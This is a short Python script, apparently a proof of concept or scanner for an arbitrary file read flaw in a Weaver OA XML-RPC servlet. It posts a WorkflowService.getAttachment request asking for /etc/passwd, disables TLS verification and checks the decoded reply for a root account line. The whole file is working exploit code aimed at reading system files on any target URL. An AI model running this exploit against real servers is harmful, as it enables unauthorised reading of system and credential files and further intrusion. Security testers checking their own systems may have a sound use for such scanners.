import requests,re,urllib3,base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def base64_decoding(string):
    string=base64.b64decode(string.encode())
    return string.decode()
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"weaver/org.apache.xmlrpc.webserver.XmlRpcServlet"
	body='''<?xml version="1.0" encoding="UTF-8"?><methodCall>
<methodName>WorkflowService.getAttachment</methodName>
<params><param><value><string>/etc/passwd</string>
</value></param></params></methodCall>'''
	headers={'Content-Type': 'application/xml'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	try:
		base64string=re.findall("<base64>(.*)</base64>",response.text)[0]
	except:
		base64string=''
	if response.status_code == 200 and re.search("root:[x*]:0:0:",base64_decoding(base64string)):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
